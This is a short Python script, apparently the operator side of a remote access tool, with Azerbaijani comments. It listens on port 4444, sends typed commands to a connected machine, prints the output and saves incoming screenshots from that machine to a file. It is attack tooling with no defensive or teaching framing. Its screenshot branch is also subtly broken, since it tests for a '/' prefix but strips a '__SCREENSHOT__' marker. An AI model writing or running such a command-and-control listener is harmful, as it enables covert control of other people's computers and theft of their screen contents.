import socket

host = '0.0.0.0'
port = 4444

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((host, port))
server.listen(1)

print("Listening for incoming connections...")
conn, addr = server.accept()
print(f"Connection from {addr}")

while True:
    command = input(">> ")
    if command.lower() == "exit":
        conn.send(b"exit")
        break

    conn.send(command.encode())

    result = conn.recv(10)
    if result.startswith(b"/"):
        data = result[len(b"__SCREENSHOT__"):] + conn.recv(1000000)  # lazımi qədər qəbul et
        with open("received_screenshot.png", "wb") as f:
            f.write(data)
        print("[✅] Screenshot yadda saxlanıldı: received_screenshot.png")
    else:
        result += conn.recv(4096)  # tam nəticəni al
        print(result.decode())

conn.close()
